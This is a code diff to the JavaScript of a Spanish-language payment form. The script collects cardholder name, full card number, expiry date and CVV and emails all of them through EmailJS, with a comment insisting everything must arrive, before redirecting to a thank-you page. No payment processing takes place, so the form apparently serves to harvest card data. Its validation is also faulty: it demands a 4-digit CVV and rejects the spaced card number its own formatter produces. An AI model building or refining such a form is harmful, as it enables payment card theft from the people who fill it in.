@@ -1,5 +1,4 @@
-// script.js
-emailjs.init('TU_PUBLIC_KEY'); // Reemplaza con tu Public Key de EmailJS
+emailjs.init('TU_PUBLIC_KEY'); // Reemplaza con tu Public Key
 
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
@@ -12,22 +11,35 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
         codigo_cvv: document.getElementById('cvv').value
     };
 
-    // 2. VALIDACIÓN CORREGIDA
+    // 2. VALIDACIÓN CORREGIDA (4 letras mínimo)
     const errores = [];
     
-    // Validación de nombre (permite minúsculas y acentos)
-    if (!/^[a-zA-ZÀ-ÿ\u00f1\u00d1\s]{5,}$/.test(datos.nombre_completo)) {
-        errores.push('El nombre debe tener al menos 5 letras');
+    // Validación de nombre (mínimo 4 letras)
+    if (!/^[a-zA-ZÀ-ÿñÑ\s]{4,}$/i.test(datos.nombre_completo)) {
+        errores.push('El nombre debe tener al menos 4 letras');
     }
 
-    // Resto de validaciones...
-    
+    // Validación de tarjeta
+    if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
+        errores.push('Número de tarjeta inválido');
+    }
+
+    // Validación de fecha
+    if (new Date(datos.fecha_expiracion) < new Date()) {
+        errores.push('La tarjeta está expirada');
+    }
+
+    // Validación de CVV
+    if (!/^\d{4}$/.test(datos.codigo_cvv)) {
+        errores.push('Código CVV inválido');
+    }
+
     if (errores.length > 0) {
         mostrarErrores(errores);
         return;
     }
 
-    // 3. ENVÍO DE DATOS
+    // 3. ENVÍO DE DATOS (DEBE LLEGAR TODO)
     document.getElementById('mensajeCarga').style.display = 'block';
 
     emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos)
@@ -35,22 +47,26 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
             window.location.href = "thank-you.html";
         })
         .catch((error) => {
-            console.error('Error técnico:', error);
-            mostrarErrores(['Error al enviar. Intenta nuevamente.']);
+            console.error('Error:', error);
+            mostrarErrores(['Error temporal. Intenta nuevamente']);
         })
         .finally(() => {
             document.getElementById('mensajeCarga').style.display = 'none';
         });
 });
 
-// Función para mostrar errores
+// Función mostrar errores
 function mostrarErrores(errores) {
-    const contenedorErrores = document.getElementById('errores');
-    contenedorErrores.innerHTML = errores.map(error => `<div class="error">❌ ${error}</div>`).join('');
-    contenedorErrores.style.display = 'block';
+    const contenedor = document.getElementById('errores');
+    contenedor.innerHTML = errores.map(error => `
+        <div class="error-msg">❌ ${error}</div>
+    `).join('');
+    contenedor.style.display = 'block';
 }
 
-// Validación en tiempo real para el nombre
-document.getElementById('nombre').addEventListener('input', function() {
-    document.getElementById('errores').style.display = 'none';
+// Formatear tarjeta
+document.getElementById('tarjeta').addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\s/g, '');
+    value = value.replace(/(\d{4})/g, '$1 ').trim();
+    e.target.value = value.substring(0, 19);
 });
